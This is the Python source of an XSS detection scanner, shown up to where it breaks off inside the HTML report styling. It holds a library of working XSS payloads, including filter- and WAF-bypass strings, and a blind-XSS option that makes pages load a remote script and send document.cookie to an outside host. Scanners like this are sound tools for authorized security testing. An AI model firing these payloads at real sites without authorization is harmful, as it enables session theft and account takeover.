#!/usr/bin/env python3
"""
XSSpy v3.0 - Advanced XSS Detection & Analysis Tool
Created by Prince Roy
For authorized security testing and educational purposes only.
"""
 
import requests
import argparse
import sys
import time
import threading
import json
import re
import random
import string
from queue import Queue, Empty
from urllib.parse import (
    urljoin, urlparse, parse_qs, urlencode,
    urlunparse, unquote
)
from bs4 import BeautifulSoup
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import Optional
from http.cookiejar import MozillaCookieJar
from pathlib import Path
import urllib3
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
# ─────────────────────────────────────────────
# ANSI color codes
# ─────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    MAGENTA= "\033[95m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"
 
    @staticmethod
    def ok(msg):    return f"{C.GREEN}[+]{C.RESET} {msg}"
    @staticmethod
    def info(msg):  return f"{C.CYAN}[*]{C.RESET} {msg}"
    @staticmethod
    def warn(msg):  return f"{C.YELLOW}[!]{C.RESET} {msg}"
    @staticmethod
    def err(msg):   return f"{C.RED}[-]{C.RESET} {msg}"
 
# ─────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────
BANNER = f"""
{C.RED}{C.BOLD}
 ██╗  ██╗███████╗███████╗██████╗ ██╗   ██╗
 ╚██╗██╔╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝
  ╚███╔╝ ███████╗███████╗██████╔╝ ╚████╔╝
  ██╔██╗ ╚════██║╚════██║██╔═══╝   ╚██╔╝
 ██╔╝ ██╗███████║███████║██║        ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        ╚═╝
{C.RESET}
{C.CYAN}  ╔══════════════════════════════════════════╗{C.RESET}
{C.CYAN}  ║  {C.BOLD}XSS Detection & Analysis Tool  v3.0{C.RESET}{C.CYAN}   ║{C.RESET}
{C.CYAN}  ║  {C.YELLOW}Created by Prince Roy{C.RESET}{C.CYAN}                    ║{C.RESET}
{C.CYAN}  ║  {C.DIM}For authorized testing only{C.RESET}{C.CYAN}               ║{C.RESET}
{C.CYAN}  ╚══════════════════════════════════════════╝{C.RESET}
"""
 
# ─────────────────────────────────────────────
# PAYLOAD LIBRARY
# ─────────────────────────────────────────────
PAYLOAD_LIBRARY = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ],
    "attribute": [
        "\" onmouseover=alert('XSS') x=\"",
        "' onmouseover=alert('XSS') x='",
        "\" autofocus onfocus=alert('XSS') x=\"",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ],
    "filter_bypass": [
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<script/src=data:,alert('XSS')>",
        "<%00script>alert('XSS')</%00script>",
        "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;('XSS')\">",
        "<svg><script>alert&#40;'XSS'&#41;</script>",
        "\"><img src=x onerror=alert('XSS')>",
        "';alert('XSS')//",
        "\";alert('XSS')//",
        "</script><script>alert('XSS')</script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    ],
    "dom": [
        "#<img src=x onerror=alert('XSS')>",
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ],
    "polyglot": [
        "javascript:/*--></title></style></textarea></script>"
        "</xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRiPt/--!>\\x3csVg/<sVg/oNloAd=alert()//>//"
    ],
    "waf_bypass": [
        "<svg onload=alert`XSS`>",
        "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
        "<script>window['alert']('XSS')</script>",
        "<!--<img src=x:--><img src=x onerror=alert('XSS')>-->",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
    ],
}
 
ALL_PAYLOADS = [p for cat in PAYLOAD_LIBRARY.values() for p in cat]
 
 
# ─────────────────────────────────────────────
# DATA CLASSES
# ─────────────────────────────────────────────
@dataclass
class Finding:
    vuln_type:   str
    severity:    str
    url:         str
    parameter:   str
    payload:     str
    method:      str
    context:     str
    confidence:  str
    timestamp:   str = field(default_factory=lambda: datetime.utcnow().isoformat())
    evidence:    str = ""
 
@dataclass
class ScanStats:
    urls_scanned:   int = 0
    forms_found:    int = 0
    params_tested:  int = 0
    payloads_sent:  int = 0
    findings:       int = 0
    errors:         int = 0
    start_time:     float = field(default_factory=time.time)
 
    def elapsed(self) -> str:
        secs = int(time.time() - self.start_time)
        return f"{secs // 60}m {secs % 60}s"
 
 
# ─────────────────────────────────────────────
# CONTEXT ANALYZER
# ─────────────────────────────────────────────
class ContextAnalyzer:
    def analyze(self, payload: str, html: str):
        idx = html.find(payload)
        if idx == -1:
            idx = html.find(unquote(payload))
        if idx == -1:
            return "NOT_REFLECTED", "POSSIBLE", "LOW"
 
        in_script = bool(re.search(r'<script[^>]*>.*?' + re.escape(payload), html, re.I | re.S))
        if in_script:
            return "SCRIPT_BLOCK", "CONFIRMED", "HIGH"
 
        in_event = bool(re.search(r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(payload), html, re.I))
        if in_event:
            return "EVENT_HANDLER", "CONFIRMED", "HIGH"
 
        in_attr = bool(re.search(r'(?:href|src|action|data)\s*=\s*["\']?' + re.escape(payload), html, re.I))
        if in_attr:
            return "HTML_ATTRIBUTE", "LIKELY", "MEDIUM"
 
        in_tag = bool(re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', html, re.I))
        if in_tag:
            return "TAG_ATTRIBUTE", "LIKELY", "MEDIUM"
 
        in_comment = bool(re.search(r'<!--.*?' + re.escape(payload) + r'.*?-->', html, re.I | re.S))
        if in_comment:
            return "HTML_COMMENT", "POSSIBLE", "LOW"
 
        return "HTML_BODY", "LIKELY", "MEDIUM"
 
 
# ─────────────────────────────────────────────
# MAIN SCANNER
# ─────────────────────────────────────────────
class XSSScanner:
    def __init__(self, config: dict):
        self.config    = config
        self.findings  = []
        self.stats     = ScanStats()
        self.lock      = threading.Lock()
        self.url_queue = Queue()
        self.analyzer  = ContextAnalyzer()
        self.verbose   = config.get("verbose", False)
 
        self.session = requests.Session()
        ua = config.get("user_agent") or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        )
        self.session.headers.update({"User-Agent": ua})
 
        for hdr in config.get("headers", []):
            k, _, v = hdr.partition(":")
            self.session.headers[k.strip()] = v.strip()
 
        if config.get("cookie"):
            for pair in config["cookie"].split(";"):
                k, _, v = pair.strip().partition("=")
                self.session.cookies.set(k.strip(), v.strip())
 
        if config.get("cookie_jar"):
            jar = MozillaCookieJar(config["cookie_jar"])
            jar.load(ignore_discard=True, ignore_expires=True)
            self.session.cookies = jar
 
        if config.get("auth"):
            u, _, p = config["auth"].partition(":")
            self.session.auth = (u, p)
 
        if config.get("proxy"):
            proxy = config["proxy"]
            self.session.proxies = {"http": proxy, "https": proxy}
 
        self.session.verify = not config.get("no_ssl_verify", False)
        self.payloads = self._build_payload_list()
        print(C.info(f"Loaded {len(self.payloads)} payloads"))
 
    # ── Payload management ────────────────────────────────────────
    def _build_payload_list(self):
        categories  = self.config.get("payload_categories", [])
        custom_file = self.config.get("payload_file")
        blind_url   = self.config.get("blind_url")
        payloads    = []
 
        if custom_file:
            payloads = self._load_file_payloads(custom_file)
        elif categories:
            for cat in categories:
                payloads.extend(PAYLOAD_LIBRARY.get(cat, []))
        else:
            payloads = list(ALL_PAYLOADS)
 
        if blind_url:
            payloads += [
                f"<script src=\"{blind_url}\"></script>",
                f"<img src=x onerror=\"fetch('{blind_url}?c='+document.cookie)\">",
                f"'><script src=\"{blind_url}\"></script>",
            ]
        return payloads
 
    @staticmethod
    def _load_file_payloads(path: str):
        try:
            lines  = Path(path).read_text(encoding="utf-8").splitlines()
            loaded = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
            print(C.ok(f"Loaded {len(loaded)} payloads from {path}"))
            return loaded
        except Exception as e:
            print(C.err(f"Cannot load payloads from {path}: {e}"))
            return []
 
    def _canary(self) -> str:
        return "XSSpy_" + "".join(random.choices(string.ascii_lowercase, k=8))
 
    # ── HTTP helpers ──────────────────────────────────────────────
    def _get(self, url: str, **kw):
        try:
            return self.session.get(url, timeout=self.config["timeout"],
                                    allow_redirects=True, **kw)
        except Exception:
            with self.lock:
                self.stats.errors += 1
            return None
 
    def _post(self, url: str, data: dict, **kw):
        try:
            return self.session.post(url, data=data, timeout=self.config["timeout"],
                                     allow_redirects=True, **kw)
        except Exception:
            with self.lock:
                self.stats.errors += 1
            return None
 
    # ── Verbose log helpers ───────────────────────────────────────
    def _vlog(self, msg: str):
        if self.verbose:
            print(msg)
 
    # ── Form parsing ──────────────────────────────────────────────
    def _parse_forms(self, url: str, html: str):
        soup  = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            details = {
                "action":  urljoin(url, form.get("action") or url),
                "method":  form.get("method", "get").lower(),
                "inputs":  [],
                "enctype": form.get("enctype", "application/x-www-form-urlencoded"),
            }
            for tag in form.find_all(["input", "textarea", "select", "button"]):
                name = tag.get("name")
                if not name:
                    continue
                details["inputs"].append({
                    "tag":   tag.name,
                    "type":  tag.get("type", "text").lower(),
                    "name":  name,
                    "value": tag.get("value", ""),
                })
            forms.append(details)
        return forms
 
    # ── Record finding ────────────────────────────────────────────
    def _record(self, finding: Finding):
        with self.lock:
            self.findings.append(finding)
            self.stats.findings += 1
        sev_c = C.RED if finding.severity == "HIGH" else (
                C.YELLOW if finding.severity == "MEDIUM" else C.DIM)
        print(
            f"\n  {sev_c}{C.BOLD}╔══ VULNERABILITY FOUND ══╗{C.RESET}\n"
            f"  {sev_c}║{C.RESET} Severity   : {sev_c}{C.BOLD}{finding.severity}{C.RESET}\n"
            f"  {sev_c}║{C.RESET} Type       : {finding.vuln_type}\n"
            f"  {sev_c}║{C.RESET} Parameter  : {C.CYAN}{finding.parameter}{C.RESET}\n"
            f"  {sev_c}║{C.RESET} Context    : {finding.context}\n"
            f"  {sev_c}║{C.RESET} Confidence : {finding.confidence}\n"
            f"  {sev_c}║{C.RESET} Payload    : {C.DIM}{finding.payload[:80]}{C.RESET}\n"
            f"  {sev_c}╚{'═'*24}╝{C.RESET}\n"
        )
 
    # ── URL parameter scan ────────────────────────────────────────
    def _scan_url_params(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return
 
        total_p = len(self.payloads)
        for param in params:
            canary = self._canary()
            test_p = {k: v[0] for k, v in params.items()}
            test_p[param] = canary
            probe_url = urlunparse(parsed._replace(query=urlencode(test_p)))
            r = self._get(probe_url)
            with self.lock:
                self.stats.params_tested += 1
 
            reflected_canary = r and canary in r.text
 
            if self.verbose:
                ref_label = f"{C.GREEN}✓ REFLECTS{C.RESET}" if reflected_canary else f"{C.DIM}✗ not reflected{C.RESET}"
                print(
                    f"\n{C.CYAN}  ┌─ Parameter: {C.BOLD}{param}{C.RESET}"
                    f"  {C.CYAN}│ Canary probe: {ref_label}"
                )
 
            for i, payload in enumerate(self.payloads, 1):
                if self.verbose:
                    short = payload[:72] + ("…" if len(payload) > 72 else "")
                    print(
                        f"  {C.CYAN}│{C.RESET} {C.MAGENTA}[{i:03d}/{total_p}]{C.RESET}"
                        f" Trying  → {C.DIM}{short}{C.RESET}"
                    )
 
                test_p[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_p)))
                r = self._get(test_url)
                with self.lock:
                    self.stats.payloads_sent += 1
 
                if not r:
                    self._vlog(f"  {C.CYAN}│{C.RESET}           {C.DIM}→ no response{C.RESET}")
                    continue
 
                context, confidence, severity = self.analyzer.analyze(payload, r.text)
                reflected = context != "NOT_REFLECTED"
 
                if self.verbose:
                    if reflected:
                        print(
                            f"  {C.CYAN}│{C.RESET}           "
                            f"{C.GREEN}→ HIT ✓  [{context}] [{severity}]{C.RESET}"
                        )
                    else:
                        print(f"  {C.CYAN}│{C.RESET}           {C.DIM}→ miss ✗{C.RESET}")
 
                if reflected:
                    self._record(Finding(
                        vuln_type  = "URL_PARAM",
                        severity   = severity,
                        url        = test_url,
                        parameter  = param,
                        payload    = payload,
                        method     = "GET",
                        context    = context,
                        confidence = confidence,
                        evidence   = r.text[max(0, r.text.find(payload) - 60):
                                            r.text.find(payload) + len(payload) + 60],
                    ))
                    if not self.config.get("continue_on_find"):
                        self._vlog(
                            f"  {C.CYAN}│{C.RESET} {C.YELLOW}[!] Stopping — first hit found (use --continue-on-find to keep going){C.RESET}"
                        )
                        break
 
            if self.verbose:
                print(f"  {C.CYAN}└─ Done: {param}{C.RESET}")
 
    # ── Form scan ─────────────────────────────────────────────────
    def _scan_forms(self, url: str, html: str):
        forms = self._parse_forms(url, html)
        with self.lock:
            self.stats.forms_found += len(forms)
 
        total_p = len(self.payloads)
        for fidx, form in enumerate(forms, 1):
            action = form["action"]
            method = form["method"]
            input_names = [i["name"] for i in form["inputs"]
                           if i["type"] not in ("hidden","submit","button","image","reset")]
 
            if self.verbose:
                print(
                    f"\n{C.BLUE}  ┌─ Form #{fidx}{C.RESET}"
                    f"  action={C.CYAN}{action}{C.RESET}"
                    f"  method={C.BOLD}{method.upper()}{C.RESET}"
                    f"  inputs={C.CYAN}{input_names}{C.RESET}"
                )
 
            for i, payload in enumerate(self.payloads, 1):
                data            = {}
                injected_params = []
 
                for inp in form["inputs"]:
                    if inp["type"] in ("hidden","submit","button","image","reset"):
                        data[inp["name"]] = inp["value"]
                    elif inp["type"] == "email":
                        data[inp["name"]] = payload + "@x.com"
                        injected_params.append(inp["name"])
                    else:
                        data[inp["name"]] = payload
                        injected_params.append(inp["name"])
 
                if self.verbose:
                    short = payload[:72] + ("…" if len(payload) > 72 else "")
                    print(
                        f"  {C.BLUE}│{C.RESET} {C.MAGENTA}[{i:03d}/{total_p}]{C.RESET}"
                        f" Injecting → {C.DIM}{short}{C.RESET}"
                    )
 
                with self.lock:
                    self.stats.payloads_sent += 1
 
                r = self._post(action, data) if method == "post" else self._get(action, params=data)
                if not r:
                    self._vlog(f"  {C.BLUE}│{C.RESET}            {C.DIM}→ no response{C.RESET}")
                    continue
 
                context, confidence, severity = self.analyzer.analyze(payload, r.text)
                reflected = context != "NOT_REFLECTED"
 
                if self.verbose:
                    if reflected:
                        print(
                            f"  {C.BLUE}│{C.RESET}            "
                            f"{C.GREEN}→ HIT ✓  [{context}] [{severity}]{C.RESET}"
                        )
                    else:
                        print(f"  {C.BLUE}│{C.RESET}            {C.DIM}→ miss ✗{C.RESET}")
 
                if reflected:
                    self._record(Finding(
                        vuln_type  = "FORM",
                        severity   = severity,
                        url        = action,
                        parameter  = ", ".join(injected_params),
                        payload    = payload,
                        method     = method.upper(),
                        context    = context,
                        confidence = confidence,
                        evidence   = r.text[max(0, r.text.find(payload) - 60):
                                            r.text.find(payload) + len(payload) + 60],
                    ))
                    if not self.config.get("continue_on_find"):
                        self._vlog(
                            f"  {C.BLUE}│{C.RESET} {C.YELLOW}[!] Stopping form — first hit found{C.RESET}"
                        )
                        break
 
            if self.verbose:
                print(f"  {C.BLUE}└─ Done: Form #{fidx}{C.RESET}")
 
    # ── Header injection scan ─────────────────────────────────────
    def _scan_headers(self, url: str):
        if not self.config.get("scan_headers"):
            return
        headers_to_test = ["Referer","X-Forwarded-For","User-Agent","Origin","X-Custom-Header"]
        total_p = min(5, len(self.payloads))
 
        if self.verbose:
            print(f"\n{C.YELLOW}  ┌─ Header injection scan ({total_p} payloads × {len(headers_to_test)} headers){C.RESET}")
 
        for header in headers_to_test:
            for i, payload in enumerate(self.payloads[:5], 1):
                if self.verbose:
                    short = payload[:60] + ("…" if len(payload) > 60 else "")
                    print(
                        f"  {C.YELLOW}│{C.RESET} {C.MAGENTA}[{i:02d}/{total_p}]{C.RESET}"
                        f" header={C.CYAN}{header}{C.RESET}"
                        f"  payload={C.DIM}{short}{C.RESET}"
                    )
 
                r = self._get(url, headers={header: payload})
                with self.lock:
                    self.stats.payloads_sent += 1
                if not r:
                    continue
 
                context, confidence, severity = self.analyzer.analyze(payload, r.text)
                if context != "NOT_REFLECTED":
                    self._vlog(f"  {C.YELLOW}│{C.RESET} {C.GREEN}→ HIT ✓  [{context}]{C.RESET}")
                    self._record(Finding(
                        vuln_type  = "HEADER",
                        severity   = severity,
                        url        = url,
                        parameter  = header,
                        payload    = payload,
                        method     = "GET",
                        context    = context,
                        confidence = confidence,
                    ))
                else:
                    self._vlog(f"  {C.YELLOW}│{C.RESET}              {C.DIM}→ miss ✗{C.RESET}")
 
        if self.verbose:
            print(f"  {C.YELLOW}└─ Header scan done{C.RESET}")
 
    # ── DOM sink detection ────────────────────────────────────────
    def _scan_dom_sinks(self, url: str, html: str):
        sinks = [
            (r'document\.write\s*\(',   "document.write"),
            (r'innerHTML\s*=',          "innerHTML"),
            (r'outerHTML\s*=',          "outerHTML"),
            (r'eval\s*\(',              "eval"),
            (r'setTimeout\s*\(',        "setTimeout"),
            (r'setInterval\s*\(',       "setInterval"),
            (r'location\.href\s*=',     "location.href"),
            (r'location\.replace\s*\(', "location.replace"),
        ]
        sources = [
            r'location\.search', r'location\.hash', r'location\.href',
            r'document\.referrer', r'document\.URL',
        ]
        for sink_pattern, sink_name in sinks:
            if re.search(sink_pattern, html, re.I):
                for src_pattern in sources:
                    if re.search(src_pattern, html, re.I):
                        finding = Finding(
                            vuln_type  = "DOM_SINK",
                            severity   = "MEDIUM",
                            url        = url,
                            parameter  = "DOM",
                            payload    = f"Sink: {sink_name}",
                            method     = "STATIC",
                            context    = "JAVASCRIPT",
                            confidence = "POSSIBLE",
                            evidence   = f"Found {sink_name} with user-controllable source",
                        )
                        with self.lock:
                            self.findings.append(finding)
                            self.stats.findings += 1
                        print(C.warn(f"DOM sink detected [{sink_name}] on {url}"))
                        break
 
    # ── Per-URL scan ──────────────────────────────────────────────
    def scan_url(self, url: str):
        with self.lock:
            self.stats.urls_scanned += 1
 
        if self.verbose:
            print(f"\n{C.BOLD}{C.CYAN}{'═'*65}{C.RESET}")
            print(f"{C.BOLD}{C.CYAN}  SCANNING: {url}{C.RESET}")
            print(f"{C.BOLD}{C.CYAN}{'═'*65}{C.RESET}")
        else:
            print(".", end="", flush=True)
 
        r = self._get(url)
        if not r:
            if self.verbose:
                print(C.err(f"  No response from {url}"))
            return
 
        if self.verbose:
            print(C.info(f"  Status: {r.status_code}  |  Length: {len(r.text):,} bytes"))
 
        html = r.text
        self._scan_url_params(url)
        self._scan_forms(url, html)
        self._scan_headers(url)
        if self.config.get("dom"):
            self._scan_dom_sinks(url, html)
 
    # ── Worker ────────────────────────────────────────────────────
    def _worker(self):
        while True:
            try:
                url = self.url_queue.get(timeout=1)
            except Empty:
                return
            if url is None:
                self.url_queue.task_done()
                return
            try:
                self.scan_url(url)
            except Exception as e:
                with self.lock:
                    self.stats.errors += 1
                if self.verbose:
                    print(C.err(f"Error on {url}: {e}"))
            finally:
                self.url_queue.task_done()
 
    # ── Entry point ───────────────────────────────────────────────
    def run(self, urls: list):
        for url in urls:
            self.url_queue.put(url)
 
        threads_n = self.config.get("threads", 5)
        threads   = []
        for _ in range(threads_n):
            self.url_queue.put(None)
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)
 
        self.url_queue.join()
        for t in threads:
            t.join()
 
        if not self.verbose:
            print()
 
    # ── HTML Report ───────────────────────────────────────────────
    def _generate_html_report(self, stats: ScanStats, findings: list) -> str:
        high   = [f for f in findings if f.severity == "HIGH"]
        medium = [f for f in findings if f.severity == "MEDIUM"]
        low    = [f for f in findings if f.severity == "LOW"]
 
        def esc(s):
            return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"','&quot;')
 
        def finding_cards(flist):
            if not flist:
                return '<p class="no-findings">No findings in this category.</p>'
            cards = []
            for i, f in enumerate(flist, 1):
                sc  = f.severity.lower()
                ev  = esc(f.evidence or "")
                pl  = esc(f.payload)
                url = esc(f.url)
                cards.append(f"""
<div class="card {sc}">
  <div class="card-hdr" onclick="tog(this)">
    <span class="badge {sc}">{f.severity}</span>
    <span class="vtype">{f.vuln_type}</span>
    <span class="param">{esc(f.parameter)}</span>
    <span class="conf">{f.confidence}</span>
    <span class="arr">▼</span>
  </div>
  <div class="card-body">
    <div class="g2">
      <div class="fld"><label>Method</label><code>{f.method}</code></div>
      <div class="fld"><label>Context</label><code>{f.context}</code></div>
      <div class="fld"><label>Timestamp</label><code>{f.timestamp}</code></div>
      <div class="fld"><label>Confidence</label><code>{f.confidence}</code></div>
    </div>
    <div class="fld full"><label>URL</label><code class="cu">{url}</code></div>
    <div class="fld full"><label>Payload</label><code class="cp">{pl}</code></div>
    {'<div class="fld full"><label>Evidence</label><code class="ce">' + ev + '</code></div>' if ev else ''}
  </div>
</div>""")
            return "\n".join(cards)
 
        ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        total = len(findings)
        risk  = min(100, len(high)*40 + len(medium)*20 + len(low)*5)
        risk_label = ("CRITICAL" if len(high) >= 3 else "HIGH" if len(high) >= 1
                      else "MEDIUM" if len(medium) >= 1 else "LOW" if len(low) >= 1 else "NONE")
 
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSSpy Report — {ts}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap');
:root{{
  --bg:#080810;--bg2:#0d0d1c;--bg3:#111120;
  --b1:#1a1a2e;--b2:#242438;
  --acc:#e8437a;--acc2:#9b5de5;--cy:#00d4ff;
  --gr:#00ff88;--yw:#ffd93d;--rd:#ff4757;
  --tx:#e8e8f4;--tx2:#9090b0;--tx3:#50507a;
  --fh:rgba(255,71,87,.07);--fm:rgba(255,217,61,.07);--fl:rgba(80,80,122,.07);
}}
*,*::before,*::after{{box-sizing:border-box;margin:0;padding:0}}
html{{scroll-behavior:smooth}}
body{{font-family:'Syne',sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;overflow-x:hidden}}
 
/* grid bg */
body::before{{content:'';position:fixed;inset:0;
  background-image:linear-gradient(rgba(232,67,122,.025) 1px,transparent 1px),
    linear-gradient(90deg,rgba(232,67,122,.025) 1px,transparent 1px);
  background-size:48px 48px;pointer-events:none;z-index:0}}
 
/* ── HEADER ── */
.hdr{{position:relative;z-index:10;
  background:linear-gradient(135deg,#0a0a18 0%,#120020 55%,#001a12 100%);
  border-bottom:1px solid var(--b2);padding:36px 56px 32px;overflow:hidden}}
.hdr::after{{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,var(--acc),var(--cy),transparent)}}
.hdr-glow{{position:absolute;top:-100px;left:50%;transform:translateX(-50%);
  width:700px;height:400px;
  background:radial-gradient(ellipse,rgba(232,67,122,.12) 0%,transparent 70%);
  pointer-events:none}}
.hdr-inner{{position:relative;display:flex;align-items:center;justify-content:space-between;gap:20px}}
.logo-wrap{{display:flex;align-items:center;gap:18px}}
.ascii{{font-family:'JetBrains Mono',monospace;font-size:8.5px;line-height:1.15;
  color:var(--acc);text-shadow:0 0 24px rgba(232,67,122,.6);white-space:pre;user-select:none}}
.title{{font-size:30px;font-weight:800;letter-spacing:-1px;
  background:linear-gradient(90deg,var(--acc),var(--acc2),var(--cy));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}}
.sub{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3);
  letter-spacing:2.5px;text-transform:uppercase;margin-top:3px}}
.author{{font-size:13px;color:var(--acc);font-weight:600;margin-top:5px}}
.hdr-meta{{text-align:right;font-family:'JetBrains Mono',monospace;font-size:11px;
  color:var(--tx3);line-height:2.1}}
.hdr-meta span{{color:var(--cy)}}
 
/* ── STAT STRIP ── */
.strip{{position:relative;z-index:5;display:grid;grid-template-columns:repeat(6,1fr);
  border-bottom:1px solid var(--b1)}}
.sc{{padding:20px 22px;border-right:1px solid var(--b1);transition:background .2s}}
.sc:last-child{{border-right:none}}
.sc:hover{{background:rgba(255,255,255,.015)}}
.sl{{font-family:'JetBrains Mono',monospace;font-size:9.5px;color:var(--tx3);
  text-transform:uppercase;letter-spacing:1.5px;margin-bottom:7px}}
.sv{{font-size:30px;font-weight:800;font-variant-numeric:tabular-nums;line-height:1}}
.sv.r{{color:var(--rd);text-shadow:0 0 24px rgba(255,71,87,.35)}}
.sv.y{{color:var(--yw);text-shadow:0 0 24px rgba(255,217,61,.3)}}
.sv.c{{color:var(--cy)}}
.sv.d{{color:var(--tx2)}}
 
/* ── RISK BAR ── */
.risk{{position:relative;z-index:5;padding:14px 56px;background:var(--bg2);
  border-bottom:1px solid var(--b1);display:flex;align-items:center;gap:18px}}
.rl{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3);
  white-space:nowrap;letter-spacing:1px}}
.rb{{flex:1;height:5px;background:var(--b2);border-radius:3px;overflow:hidden}}
.rf{{height:100%;border-radius:3px;
  background:linear-gradient(90deg,var(--gr),var(--yw),var(--rd));
  transition:width 1.2s cubic-bezier(.4,0,.2,1)}}
.rs{{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700;
  color:var(--acc);white-space:nowrap}}
 
/* ── TABS ── */
.tabs{{position:relative;z-index:5;background:var(--bg2);
  border-bottom:1px solid var(--b1);padding:0 56px;display:flex;gap:0}}
.tb{{padding:13px 22px;font-family:'JetBrains Mono',monospace;font-size:11px;
  font-weight:600;letter-spacing:1.2px;text-transform:uppercase;
  color:var(--tx3);background:none;border:none;border-bottom:2px solid transparent;
  cursor:pointer;transition:all .2s;white-space:nowrap}}
.tb:hover{{color:var(--tx)}}
.tb.on{{color:var(--acc);border-bottom-color:var(--acc)}}
.tc{{display:inline-flex;align-items:center;justify-content:center;
  width:17px;height:17px;border-radius:50%;font-size:9px;font-weight:700;
  margin-left:5px;background:var(--acc);color:#fff}}
.tc.y{{background:var(--yw);color:#000}}
.tc.d{{background:var(--b2);color:var(--tx3)}}
 
/* ── MAIN ── */
.main{{position:relative;z-index:5;padding:40px 56px 80px}}
.pnl{{display:none}}.pnl.on{{display:block}}
 
.sec-hdr{{display:flex;align-items:center;gap:14px;margin-bottom:22px}}
.sec-title{{font-size:11px;font-weight:700;letter-spacing:2.5px;
  text-transform:uppercase;color:var(--tx2)}}
.sec-line{{flex:1;height:1px;background:linear-gradient(90deg,var(--b2),transparent)}}
.sec-cnt{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3)}}
 
/* ── OVERVIEW ── */
.ov-grid{{display:grid;grid-template-columns:1fr 1fr;gap:22px;margin-bottom:32px}}
.ov-card{{background:var(--bg2);border:1px solid var(--b1);border-radius:8px;padding:22px}}
.ov-card h3{{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;
  color:var(--tx3);margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--b1)}}
.sr{{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--b1)}}
.sr:last-child{{border-bottom:none}}
.dot{{width:7px;height:7px;border-radius:50%;flex-shrink:0}}
.dot.h{{background:var(--rd);box-shadow:0 0 8px var(--rd)}}
.dot.m{{background:var(--yw);box-shadow:0 0 8px var(--yw)}}
.dot.l{{background:var(--tx3)}}
.sn{{font-size:13px;color:var(--tx);flex:1}}
.sv2{{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700}}
.sv2.h{{color:var(--rd)}}.sv2.m{{color:var(--yw)}}.sv2.l{{color:var(--tx3)}}
.mr{{display:flex;justify-content:space-between;padding:8px 0;
  border-bottom:1px solid var(--b1);font-size:13px}}
.mr:last-child{{border-bottom:none}}
.mk{{color:var(--tx3)}}.mv{{font-family:'JetBrains Mono',monospace;color:var(--cy)}}
 
/* ── CARDS ── */
.card{{border:1px solid var(--b1);border-radius:8px;margin-bottom:10px;overflow:hidden;
  transition:border-color .2s,transform .15s}}
.card:hover{{transform:translateX(3px)}}
.card.high  {{border-left:3px solid var(--rd);background:var(--fh)}}
.card.medium{{border-left:3px solid var(--yw);background:var(--fm)}}
.card.low   {{border-left:3px solid var(--tx3);background:var(--fl)}}
.card-hdr{{display:flex;align-items:center;gap:11px;padding:13px 16px;cursor:pointer}}
.card-hdr:hover{{background:rgba(255,255,255,.015)}}
.badge{{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
  letter-spacing:1.5px;padding:3px 8px;border-radius:3px;text-transform:uppercase}}
.badge.high  {{background:rgba(255,71,87,.18);color:var(--rd);border:1px solid rgba(255,71,87,.35)}}
.badge.medium{{background:rgba(255,217,61,.18);color:var(--yw);border:1px solid rgba(255,217,61,.35)}}
.badge.low   {{background:rgba(80,80,122,.25);color:#888;border:1px solid rgba(80,80,122,.4)}}
.vtype{{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;color:var(--cy)}}
.param{{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--acc)}}
.conf{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3);margin-left:auto}}
